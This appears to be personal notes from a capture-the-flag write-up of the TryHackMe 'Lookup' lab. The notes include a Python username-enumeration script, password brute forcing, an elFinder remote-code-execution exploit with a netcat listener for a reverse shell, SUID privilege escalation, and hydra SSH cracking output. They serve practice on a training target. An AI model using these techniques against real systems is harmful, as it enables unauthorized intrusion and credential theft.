@@ -1,0 +1,116 @@
+https://tryhackme.com/room/lookup
+
+
+EVERY NEW URL > add to /etc/hosts if it not responds
+
+nmap
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d0:c2:7e:c0:51:35:67:e2:2f:ba:d9:17:b4:f9:de:73 (RSA)
+|   256 ba:f4:a3:65:5a:6f:c7:09:97:89:88:8e:03:df:fa:43 (ECDSA)
+|_  256 0a:9d:1b:8d:a7:cc:34:30:c7:14:cc:70:6a:fc:76:0f (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Login Page
+
+Brute force with hydra or python script for only the username , cf 
+
+import requests
+
+# Define the target URL
+url = "http://lookup.thm/login.php"
+
+# Define the file path containing usernames
+file_path = "/usr/share/seclists/Usernames/Names/names.txt"
+
+# Read the file and process each line
+try:
+    with open(file_path, "r") as file:
+        for line in file:
+            username = line.strip()
+            if not username:
+                continue  # Skip empty lines
+            
+            # Prepare the POST data
+            data = {
+                "username": username,
+                "password": "password"  # Fixed password for testing
+            }
+
+            # Send the POST request
+            response = requests.post(url, data=data)
+            
+            # Check the response content
+            if "Wrong password" in response.text:
+                print(f"Username found: {username}")
+            elif "wrong username" in response.text:
+                continue  # Silent continuation for wrong usernames
+except FileNotFoundError:
+    print(f"Error: The file {file_path} does not exist.")
+except requests.RequestException as e:
+    print(f"Error: An HTTP request error occurred: {e}")
+    
+    
+    after finding username, brute force with rockyou.txt on (jose) 
+    found password123
+    
+    it works , file.lookup.thm and it is elFinder (file maangement?) 
+    
+    the version of elFinder has a vulnerability 
+    
+    https://www.exploit-db.com/exploits/46481
+    
+    https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce?utm_source=chatgpt.com
+    
+    github script works, must adapt to :
+    python3 cve.py -t 'http://files.lookup.thm/elFinder/' -lh 10.8.181.99 -lp 1337
+                        my url                                  my tun0        the port
+                        
+   another terminal : nc -lvnp 1337 
+   
+   and reverse shell
+   
+   
+   Need to find user.txt (found in think home direct, no permission
+   
+   # Privesc
+   
+   /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+    linpeas and found a weird suid /usr/sbin/pwm 
+    
+    try to execute it and it says :
+    /usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: www-data
+[-] File /home/www-data/.passwords not found
+
+https://0xb0b.gitbook.io/writeups/tryhackme/2024/lookup
+
+after that on the gitbook i followed (to understand more deeply)
+
+founded the list in .passwords when tricked the path
+
+hydra on hosts 
+hydra -l think -P .passwords lookup.thm ssh
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-28 01:15:53
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
+[DATA] attacking ssh://lookup.thm:22/
+[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-28 01:16:01
+
+then ssh
+LFILE=/root/root.txt
+
+
+
+
+find password in /etc/shadow SHA 51?? , how to dehash, salt ,... to understand
